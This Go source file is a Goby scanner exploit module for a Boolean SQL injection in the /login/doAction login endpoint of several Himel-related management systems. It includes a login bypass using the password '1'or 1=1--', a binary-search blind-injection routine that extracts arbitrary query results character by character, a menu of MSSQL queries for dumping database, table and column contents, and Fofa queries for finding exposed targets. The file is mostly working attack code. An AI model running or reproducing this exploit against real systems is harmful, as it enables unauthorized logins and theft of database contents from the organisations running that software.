package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Multiple Management Systems login Boolean SQLi",
    "Description": "There is a Boolean SQL injection vulnerability in the login of multiple information management systems. Through this vulnerability, an attacker can directly log in to the system using the universal password such like \"1'or 1='1\", and even obtain sensitive information in the database through Boolean blind injection",
    "Impact": "Multiple Management Systems login Boolean SQLi",
    "Recommendation": "<p>Strictly filter and filter the legitimacy of the data entered by the user to prevent the attacker from using this vulnerability to invade.</p>",
    "Product": "Himel Information  Mangange System,Engineering Material Mangange System,Enterprise Mangange System",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "多个管理系统doAction存在SQL注入漏洞",
            "Description": "<p>使用/login/doAction作为信息系统的登陆接口，大规模应用于信息、管理等系统。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">/login/doAction</span>中存在布尔SQL注入漏洞，通过该漏洞攻击者可以直接使用\\\"1'or 1='1\\\"等通用密码登录系统，甚至可以通过布尔盲注获取数据库中的敏感信息。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，可通过以下方式暂缓攻击：</p><p>1、部署Web应用防火墙，对数据库操作进行监控。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "信息管理系统",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Multiple Management Systems login Boolean SQLi",
            "Description": "There is a Boolean SQL injection vulnerability in the login of multiple information management systems. Through this vulnerability, an attacker can directly log in to the system using the universal password such like \"1'or 1='1\", and even obtain sensitive information in the database through Boolean blind injection",
            "Impact": "Multiple Management Systems login Boolean SQLi",
            "Recommendation": "<p>Strictly filter and filter the legitimacy of the data entered by the user to prevent the attacker from using this vulnerability to invade.<br></p>",
            "Product": "Himel Information  Mangange System,Engineering Material Mangange System,Enterprise Mangange System",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"Content/images/login/logo.png\" &&body= \"/Content/js/core/knockout-2.2.1.js\"",
    "GobyQuery": "body=\"Content/images/login/logo.png\" &&body= \"/Content/js/core/knockout-2.2.1.js\"",
    "Author": "corpp0ra1@qq.com",
    "Homepage": "https://www.himel.com/,",
    "DisclosureDate": "2021-07-20",
    "References": [
        "https://www.pwnwiki.org/index.php?title=%E4%B8%80%E5%8D%A1%E9%80%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%B5%B1_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zh-hant"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "sqlQuery,show SQLQuery Help",
            "show": ""
        },
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "db_name()",
            "show": "AttackType=sqlQuery"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Management-System"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10241"
}`

	runSqliPayload := func(hostinfo *httpclient.FixUrl, sqliPayload string) int {
		cfg := httpclient.NewPostRequestConfig("/login/doAction")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf(`{"usercode":"super","password":"1' or 1=2/(case when (%s) then 2 else 1 end)-- ","verificationcode":"","remember":true,"ip":"","city":""}`, sqliPayload)
		if resp1, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
			if strings.Contains(resp1.RawBody, "\"status\":\"success\"") {
				return 1
			} else if strings.Contains(resp1.RawBody, "\"status\":\"error\"") {
				return 0
			}
		}
		return -1
	}
	binarySearch := func(hostinfo *httpclient.FixUrl, payload string, left, right int) int {
		var mid int
		var ret int
		for left != right {
			mid = (left + right) / 2
			payloadTmp := fmt.Sprintf(payload, mid)
			ret = runSqliPayload(hostinfo, payloadTmp)
			if ret == 1 {
				left = mid + 1
			} else if ret == 0 {
				right = mid
			} else {
				return -1
			}
		}
		return left
	}
	getSqliPayload := func(hostinfo *httpclient.FixUrl, sqlQuery string) string {
		var ret int
		getLenPayload := fmt.Sprintf(`len((%s))>`, sqlQuery) + "%d"
		ret = binarySearch(hostinfo, getLenPayload, 0, 50)
		if ret == -1 {
			return "An unexpected error was found during SQL injection,Please check whether your SQL statement is entered correctly"
		}
		len := ret
		data := ""
		getDataPayload := fmt.Sprintf("ascii(substring((%s),{{{N}}},1)) >", sqlQuery)
		for i := 1; i <= len; i++ {
			payloadTmp := strings.ReplaceAll(getDataPayload, "{{{N}}}", strconv.Itoa(i)) + "%d"
			ret = binarySearch(hostinfo, payloadTmp, 32, 126)
			if ret == -1 {
				return "{{{error}}}"
			}
			data += string(ret)
		}
		return data
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/login/doAction")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = `{"usercode":"super","password":"1'or 1=1--","verificationcode":"","remember":true,"ip":"","city":""}`
			if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "\"status\":\"success\"") {
					cfg.Data = `{"usercode":"super","password":"1","verificationcode":"","remember":true,"ip":"","city":""}`
					if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "\"status\":\"error\"") {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			switch ss.Params["AttackType"].(string) {
			case "sqlQuery":
				sqlQuery := ss.Params["sqlQuery"].(string)
				expResult.Output = getSqliPayload(expResult.HostInfo, sqlQuery)
				if expResult.Output == "{{{error}}}" {
					expResult.Output = "An unexpected error was found during SQL injection,Please check whether your SQL statement is entered correctly"
					expResult.Success = false
				}
				expResult.Success = true
			case "show SQLQuery Help":
				expResult.Success = true
				expResult.Output += "current DB->db_name()\n"
				expResult.Output += "DB Num->cast((select count(*) from master.dbo.sysdatabases) as char)\n"
				expResult.Output += "DB Name->select top 1 name from master.dbo.sysdatabases where dbid=[N]\n"
				expResult.Output += "Table Name1->select top 1 name from [DB].dbo.sysobjects where xtype=0x75\n"
				expResult.Output += "Table Name2->select top 1 name from [DB].dbo.sysobjects where xtype='u' and name not in ('[TB]')\n"
				expResult.Output += "Column Name->select top 1 name from [DB].dbo.syscolumns where id=object_id('[DB].dbo.[TB]')\n"
				expResult.Output += "Column Data->select top 1 [C] from [DB].dbo.[TB]\n"
			}
			return expResult
		},
	))
}
